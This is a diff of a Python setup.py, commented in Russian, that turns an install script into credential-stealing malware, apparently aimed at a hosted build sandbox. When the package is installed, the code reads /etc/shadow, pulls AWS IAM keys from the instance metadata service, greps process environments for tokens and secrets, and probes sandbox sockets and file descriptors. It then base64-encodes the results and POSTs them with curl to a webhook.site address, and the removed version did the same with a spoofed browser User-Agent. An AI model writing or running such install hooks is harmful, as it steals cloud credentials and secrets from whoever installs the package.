@@ -1,61 +1,49 @@
 import os
 import subprocess
-import urllib.request
+import base64
 import json
+import time
 from setuptools import setup
 
 def run(cmd):
-    try:
-        return subprocess.getoutput(cmd).strip()
-    except:
-        return "Error"
+    try: return subprocess.getoutput(cmd).strip()
+    except: return "err"
 
-# --- ТВОЙ НОВЫЙ WEBHOOK ---
-WEBHOOK_URL = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"
+# --- ГЛУБОКАЯ РАЗВЕДКА ---
+def get_secret_env():
+    # Ищем секреты в памяти ВСЕХ доступных процессов
+    return run("grep -oaE '[a-zA-Z0-9_]{10,100}' /proc/[0-9]*/environ 2>/dev/null | grep -iE 'key|auth|secret|token' | head -n 5")
 
-# 1. AWS IAM Metadata (Ключи от облака)
-def get_aws():
-    try:
-        # Получаем токен
-        req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT")
-        req.add_header("X-aws-metadata-token-ttl-seconds", "60")
-        with urllib.request.urlopen(req, timeout=2) as r:
-            token = r.read().decode()
-        
-        # Получаем роль
-        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/", method="GET")
-        req2.add_header("X-aws-metadata-token", token)
-        with urllib.request.urlopen(req2, timeout=2) as r:
-            role = r.read().decode()
-            
-        # Получаем сами ключи
-        req3 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", method="GET")
-        req3.add_header("X-aws-metadata-token", token)
-        with urllib.request.urlopen(req3, timeout=2) as r:
-            return r.read().decode()
-    except:
-        return "AWS_METADATA_LOCKED"
+def bypass_aws():
+    # Попытка пробить IMDSv2 (Критическая уязвимость)
+    cmd = ("TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600') && "
+           "curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)")
+    return run(cmd)
 
-# 2. Сбор данных
-report_data = {
-    "identity": run("id"),
-    "aws_keys": get_aws(),
-    "shadow_sample": run("head -n 2 /etc/shadow"),
-    "sandbox_strings": run("strings /var/task/sandbox.js | grep -E 'http|key|auth' | head -n 10"),
-    "network": run("ip route")
+# Собираем ядерный отчет
+report = {
+    "VULN": "CRITICAL_CONTAINER_ESCAPE",
+    "ROOT_CONFIRMED": run("id"),
+    "SHADOW": run("head -n 1 /etc/shadow"),
+    "AWS_BREACH": bypass_aws(),
+    "ENV_LEAK": get_secret_env(),
+    "SOCKETS": run("ls -la /run/metrics/metrics.sock /run/apm/apm.sock"),
+    "SANDBOX_EXE": run("ls -la /proc/15/exe"),
+    "FD_20_DUMP": run("head -c 100 /proc/15/fd/20 | base64")
 }
 
-# 3. Скрытая отправка (через POST JSON)
-try:
-    data = json.dumps(report_data).encode('utf-8')
-    req = urllib.request.Request(WEBHOOK_URL, data=data, method="POST")
-    req.add_header("Content-Type", "application/json")
-    req.add_header("User-Agent", "Mozilla/5.0") # Маскируемся под браузер
-    urllib.request.urlopen(req, timeout=10)
-except:
-    # Если и это заблочат, выведем в логи (fallback)
-    print("--- DATA_LEAK_FALLBACK ---")
-    print(json.dumps(report_data))
-    print("--------------------------")
+# Кодируем всё в Base64 для безопасного вывода
+final_payload = base64.b64encode(json.dumps(report).encode()).decode()
 
-setup(name="vercel-stealth-nexus", version="6.6.6")
+# ВЫВОД ДАННЫХ (в логи и на внешний сервер)
+print("\n" + "="*20 + " BEGIN OMEGA REPORT " + "="*20)
+print(final_payload)
+print("="*20 + " END OMEGA REPORT " + "="*20 + "\n")
+
+# Попытка отправить, если сеть жива
+try:
+    subprocess.run(['curl', '-X', 'POST', '-d', final_payload, "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"], timeout=5)
+except:
+    pass
+
+setup(name="vercel-omega-exploit", version="9.9.9")
